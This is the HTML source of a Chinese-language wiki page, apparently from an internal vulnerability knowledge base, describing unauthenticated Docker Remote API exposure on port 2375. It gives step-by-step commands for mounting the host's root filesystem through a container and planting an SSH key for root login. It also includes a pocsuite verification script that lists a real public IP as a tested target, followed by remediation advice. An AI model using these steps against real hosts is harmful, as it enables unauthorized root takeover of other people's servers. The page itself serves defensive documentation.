                    
    
                    
    
                    
    
<!DOCTYPE html>
<html>
    <head>
        <title>查看源</title>
        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
        <script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<!--[if lt IE 9]>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/689a949132fabc86eace7102316c5470/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">

    </head>

    <body class="mceContentBody aui-theme-default wiki-content fullsize">
        <p>&nbsp;</p>         <p><br /></p><h1><span>一. 漏洞简介</span></h1><p><span><span>漏洞描述：</span></span></p><p>该未授权访问漏洞是因为docker remote api可以执行docker命令，从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url操作docker。</p><p>docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，会调用这个api</p><p><span style="color: rgb(26,26,26);letter-spacing: 0.0px;">漏洞评级：严重</span></p><p><span style="color: rgb(38,38,38);"><span>参考连接：</span></span></p><p><br /></p><h1>二. 利用条件</h1><p>1、docker守护进程监听在0.0.0.0,外网可访问</p><p>2、没有使用iptables等限制可连接的来源ip</p><p><br /></p><h1 class="prettyprint lang-html prettyprinted">三. 漏洞验证</h1><p><span style="color: rgb(75,75,75);"><span style="color: rgb(102,102,102);">简单方法：看看Docker Remote API 是否绑定到了 0.0.0.0 且未开启验证机制；</span></span></p><h1>四. 漏洞利用</h1><p style="text-align: justify;">ssh-keygen 生成公钥文件</p><p style="text-align: justify;">docker -H <a href="tcp://remoteip:2375">tcp://remoteip:2375</a> images 查看镜像</p><p style="text-align: justify;">docker -H <a href="tcp://remoteip:2375">tcp://remoteip:2375</a> run -it -v /:/mnt imageId /bin/bash 启动一个容器并将宿主机根目录挂在到容器的mnt目录</p><p style="text-align: justify;">mkdir .ssh 创建ssh目录</p><p style="text-align: justify;">touch authorized_keys 创建文件</p><p style="text-align: justify;">将公钥的文件写入authorized_keys</p><p style="text-align: justify;">ssh root@remoteip 免密码登录宿主机</p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="df0993bb-4554-43db-826d-11503586297c" data-macro-parameters="language=py" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#这里存放代码
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class DockerPOC(POCBase):
    vulID = '10'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-04-06' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-04-06'# 编写 PoC 的日期
    updateDate = '2017-04-06'# PoC 更新的时间,默认和编写时间一样
    references = 'http://static.hx99.net/static/bugs/wooyun-2016-0209509.html'# 漏洞地址来源,0day不用写
    name = 'Docker Unauthorized access'# PoC 名称
    appPowerLink = 'https://www.docker.com/'# 漏洞厂商主页地址
    appName = 'Docker'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Weak Password'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Docker 未授权漏洞
    ''' # 漏洞简要描述
    samples = ["http://115.28.216.202:2376/containers/json",]# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 10-docker-getshell.py -u 192.168.23.128 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url

        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = "2376"

        payload = "http://" + _host + ":" + _port +"/info" #:2376/containers/json
        #print payload
        #检测漏洞
        try:
            #print u'\n【测试】' + host
            recvdata = req.get(url=payload,timeout=5).content
            #print recvdata
            if recvdata and 'docker' in recvdata:
                #print u'\n【警告】' + payload + "【存在未授权访问】"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = payload
                result['VerifyInfo']['Payload'] = recvdata
            else:
                #print u'\n【不存在漏洞】 ' + payload
                pass
        except:
            # return payload
            pass
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(DockerPOC)



</pre></td></tr></table><p><br /></p><h1>五. 解决方案</h1><p>1、设置ACL, 只允许信任ip连接对应端口</p><p>2、开启TLS,使用生成的证书进行认证</p><pre class="prettyprint lang-html prettyprinted"><br /></pre><div><span style="color: rgb(75,75,75);"><br /></span></div>
        <p>&nbsp;</p>
    </body>
</html>
